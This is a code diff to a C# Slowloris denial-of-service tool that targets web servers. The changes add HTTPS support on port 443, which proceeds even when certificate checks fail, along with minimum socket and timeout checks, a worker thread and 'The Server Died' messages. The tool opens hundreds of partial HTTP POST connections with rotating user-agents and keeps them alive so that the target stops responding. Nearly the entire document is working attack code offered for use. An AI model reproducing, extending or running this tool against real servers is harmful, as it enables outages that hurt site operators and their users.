@@ -8,6 +8,7 @@ using System.Threading.Tasks;
 using CommandLine;
 using System.Threading;
 using System.IO;
+using System.Net.Security;
 
 namespace slowloris
 {
@@ -18,7 +19,7 @@ namespace slowloris
         public string Address { get; set; }
 
         [Option('p', "port", DefaultValue = 80,
-          HelpText = "The port to attack on the target server. HTTPS is not yet supported!")]
+          HelpText = "The port to attack on the target server. HTTPS is only supported on port 443 as of right now!")]
         public int Port { get; set; }
 
         [Option('s', "sockets", DefaultValue = 200,
@@ -32,15 +33,23 @@ namespace slowloris
 
     class Program
     {
+        private static int FailCountBeforeError = 10;
+        private static readonly object ConsoleWriterLock = new object();
+
         static void Main(string[] args)
         {
+            // For Debugging 
+            // System.Diagnostics.Debugger.Launch();
+
             Console.Title = "Slow Loris";
             Console.ForegroundColor = ConsoleColor.White;
 
+            #region Command Line Args
             Options cmdargs = new Options();
             bool cmdargscheck = Parser.Default.ParseArgumentsStrict(args, cmdargs);
 
-            if (!cmdargscheck) {
+            if (!cmdargscheck)
+            {
                 Console.WriteLine(" [-] Failed to parse command line arguments!");
                 Console.ReadLine();
                 Environment.Exit(1);
@@ -49,25 +58,45 @@ namespace slowloris
             Console.WriteLine(" [*] Target: " + cmdargs.Address);
 
             string ip = Dns.GetHostAddresses(cmdargs.Address)[0].ToString();
-            if (ip != cmdargs.Address) {
+            if (ip != cmdargs.Address)
+            {
                 Console.WriteLine(" [*] Target's IP Resolved To: " + ip);
             }
 
             Console.WriteLine(" [*] Port: " + cmdargs.Port);
+
+            if (cmdargs.Sockets <= 99)
+            {
+                ConsoleColor before = Console.ForegroundColor;
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine(" [-] Error - You require at least 100 Sockets!");
+                Console.ForegroundColor = before;
+                return;
+            }
 
             if (cmdargs.Sockets != 200)
             {
                 Console.WriteLine(" [+] Sockets: " + cmdargs.Sockets);
             }
 
+            if (cmdargs.Timeout <= 4)
+            {
+                ConsoleColor before = Console.ForegroundColor;
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine(" [-] Error - You require at least 5 seconds for the Timeout!");
+                Console.ForegroundColor = before;
+                return;
+            }
+
             if (cmdargs.Timeout != 15)
             {
                 Console.WriteLine(" [+] Timeout: " + cmdargs.Timeout);
             }
+            #endregion
 
             Console.WriteLine("\r\n [*] Starting Slow Loris...");
 
-            SlowLoris(ip, cmdargs.Port, cmdargs.Sockets, cmdargs.Timeout);
+            SlowLoris(cmdargs.Address, ip, cmdargs.Port, cmdargs.Sockets, cmdargs.Timeout);
 
             Console.WriteLine(" [*] Started Slow Loris...");
 
@@ -76,7 +105,6 @@ namespace slowloris
 
         #region SlowLorisVars
         private static Random UserAgentRandomizer = new Random(DateTime.UtcNow.Millisecond);
-        private static List<SlowLorisConnection> SlowLorisConnections = new List<SlowLorisConnection>();
         private static List<string> UserAgents = new List<string>() {
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
@@ -105,28 +133,52 @@ namespace slowloris
             "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"
         };
         #endregion
-        private static void SlowLoris(string ip, int port, int sockets, int timeout)
+        private static void SlowLoris(string address, string ip, int port, int sockets, int timeout)
         {
-            new Thread(() => KeepAlive(sockets, timeout)).Start();
+            // Left this way after a failed attempt at multi-threading
+            // I was not seeing any performance benefits
+            Thread X = new Thread(() =>
+            {
+                SlowLorisWorker(address, ip, port, sockets, timeout);
+            });
 
-            while (SlowLorisConnections.Count < sockets) {
+            X.Start();
+        }
+
+        #region Slow Loris Worker
+        private static void SlowLorisWorker(string address, string ip, int port, int sockets, int timeout)
+        {
+            List<SlowLorisConnection> SlowLorisConnections = new List<SlowLorisConnection>();
+            new Thread(() => KeepAlive(sockets, timeout, SlowLorisConnections)).Start();
+
+            int ConsectutiveFailures = 0;
+            while (SlowLorisConnections.Count < sockets)
+            {
                 // Add New Connection
                 try
                 {
-                    SlowLorisConnection slc = new SlowLorisConnection(ip, port, UserAgents[UserAgentRandomizer.Next(0, UserAgents.Count - 1)]);
+                    SlowLorisConnection slc = new SlowLorisConnection(address, ip, port, UserAgents[UserAgentRandomizer.Next(0, UserAgents.Count - 1)]);
                     SlowLorisConnections.Add(slc);
+                    ConsectutiveFailures = 0;
                 }
-                catch (Exception)
+                catch (Exception EX)
                 {
-                    ConsoleColor before = Console.ForegroundColor;
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine(" [*] Server Died at " + DateTime.Now);
-                    Console.ForegroundColor = before;
+                    if (ConsectutiveFailures >= FailCountBeforeError)
+                    {
+                        lock (ConsoleWriterLock)
+                        {
+                            ConsoleColor before = Console.ForegroundColor;
+                            Console.ForegroundColor = ConsoleColor.Red;
+                            Console.WriteLine(" [*] The Server Died at " + DateTime.Now);
+                            Console.ForegroundColor = before;
+                        }
+                    }
+                    ConsectutiveFailures++;
                 }
             }
         }
 
-        private static void KeepAlive(int sockets, int timeout)
+        private static void KeepAlive(int sockets, int timeout, List<SlowLorisConnection> SlowLorisConnections)
         {
             ConsoleColor before = Console.ForegroundColor;
 
@@ -134,37 +186,47 @@ namespace slowloris
             {
                 bool died = false;
 
-                for(int x = 0; x < SlowLorisConnections.Count; x++)
+                for (int x = 0; x < SlowLorisConnections.Count; x++)
                 {
                     try
                     {
                         SlowLorisConnections[x].SendKeepAlive();
                     }
-                    catch (Exception) {
+                    catch (Exception)
+                    {
                         // Remove Dead Connection
                         SlowLorisConnections.Remove(SlowLorisConnections[x]);
 
                         // Add New Connection
-                        try
+                        if (SlowLorisConnections.Count < sockets)
                         {
-                            SlowLorisConnection slc = new SlowLorisConnection(SlowLorisConnections[x].ip, SlowLorisConnections[x].port, UserAgents[UserAgentRandomizer.Next(0, UserAgents.Count - 1)]);
-                            SlowLorisConnections.Add(slc);
-                        }
-                        catch (Exception)
-                        {
-                            Console.ForegroundColor = ConsoleColor.Red;
-                            Console.WriteLine(" [*] Server Died at " + DateTime.Now);
-                            Console.ForegroundColor = before;
-                            died = true;
+                            try
+                            {
+                                SlowLorisConnection slc = new SlowLorisConnection(SlowLorisConnections[x].address, SlowLorisConnections[x].ip, SlowLorisConnections[x].port, UserAgents[UserAgentRandomizer.Next(0, UserAgents.Count - 1)]);
+                                SlowLorisConnections.Add(slc);
+                            }
+                            catch (Exception)
+                            {
+                                lock (ConsoleWriterLock)
+                                {
+                                    Console.ForegroundColor = ConsoleColor.Red;
+                                    Console.WriteLine(" [*] The Server Died at " + DateTime.Now);
+                                    Console.ForegroundColor = before;
+                                }
+                                died = true;
+                            }
                         }
                     }
                 }
 
                 if (SlowLorisConnections.Count != 0 && !died)
                 {
-                    Console.ForegroundColor = ConsoleColor.Green;
-                    Console.WriteLine(" [+] Sent Keep Alive to {0} connections!", SlowLorisConnections.Count);
-                    Console.ForegroundColor = before;
+                    lock (ConsoleWriterLock)
+                    {
+                        Console.ForegroundColor = ConsoleColor.Green;
+                        Console.WriteLine(" [+] Sent Keep Alive to {0} connections!", SlowLorisConnections.Count);
+                        Console.ForegroundColor = before;
+                    }
                 }
 
                 // Sleep For timeout After Every Itteration
@@ -172,16 +234,21 @@ namespace slowloris
                 Thread.Sleep(timeout * 1000);
             }
         }
+        #endregion
     }
 
+    #region Slow Loris Connection
     internal class SlowLorisConnection
     {
+        public string address { get; private set; }
         public string ip { get; private set; }
         public int port { get; private set; }
         private Random randomizer;
-        private StreamWriter TCPWriter; 
+        private StreamWriter TCPWriter;
+        private SslStream SSLWriter;
 
-        public SlowLorisConnection(string ip, int port, string ua) {
+        public SlowLorisConnection(string address, string ip, int port, string ua) {
+            this.address = address;
             this.ip = ip;
             this.port = port;
             randomizer = new Random(DateTime.UtcNow.Millisecond);
@@ -189,23 +256,46 @@ namespace slowloris
             // Connect & Check for Timeout
             TcpClient TCPClient = new TcpClient();
             var result = TCPClient.BeginConnect(ip, port, null, null);
+
             var success = result.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(3));
             if (!success)
             {
                 throw new Exception("Connection Timed Out!");
             }
-            TCPWriter = new StreamWriter(TCPClient.GetStream());
-            TCPWriter.AutoFlush = false;
 
-            TCPWriter.WriteLine("POST / HTTP/1.1");
-            TCPWriter.WriteLine("Content-type: application/x-www-form-urlencoded");
-            TCPWriter.WriteLine(string.Format("Content-Length: {0}", randomizer.Next(0, 5000)));
-            TCPWriter.WriteLine(string.Format("User-Agent: {0}", ua));
-            TCPWriter.WriteLine("Accept-language: en-US,en,q=0.5");
-            TCPWriter.Flush();
+            string Request = $" POST / HTTP/1.1\r\nContent-type: application/x-www-form-urlencoded\r\n" +
+                $"{string.Format("Content-Length: {0}", randomizer.Next(0, 5000))}\r\n{string.Format("User-Agent: {0}", ua)}\r\nAccept-language: en-US,en,q=0.5\r\n";
+
+            if (port == 443)
+            {
+                SSLWriter = new SslStream(TCPClient.GetStream());
+
+                // How do  I allow snake oil certs
+                try
+                {
+                    SSLWriter.AuthenticateAsClient(address);
+                }
+                catch (Exception) {
+
+                }
+
+
+                SSLWriter.Write(Encoding.UTF8.GetBytes(Request));
+
+                SSLWriter.Flush();
+            }
+            else
+            {
+                TCPWriter = new StreamWriter(TCPClient.GetStream());
+
+                TCPWriter.Write(Request);
+
+                TCPWriter.Flush();
+            }
         }
 
         private List<string> postvalues = new List<string>() {
+            "&username={0}",
             "&email={0}",
             "&password={0}",
             "&data={0}",
@@ -216,8 +306,22 @@ namespace slowloris
         };
 
         public void SendKeepAlive() {
-            TCPWriter.Write(string.Format(postvalues[randomizer.Next(0, postvalues.Count)], randomizer.Next(1, 5000)));
-            TCPWriter.Flush();
+            if (TCPWriter != null && SSLWriter == null)
+            {
+                TCPWriter.Write(string.Format(postvalues[randomizer.Next(0, postvalues.Count)], randomizer.Next(1, 5000)));
+
+                TCPWriter.Flush();
+            }
+            else if (TCPWriter == null && SSLWriter != null)
+            {
+                SSLWriter.Write(Encoding.UTF8.GetBytes(string.Format(postvalues[randomizer.Next(0, postvalues.Count)], randomizer.Next(1, 5000))));
+
+                SSLWriter.Flush();
+            }
+            else {
+                throw new Exception("Unexcpected Stream Configuration");
+            }
         }
     }
+    #endregion
 }
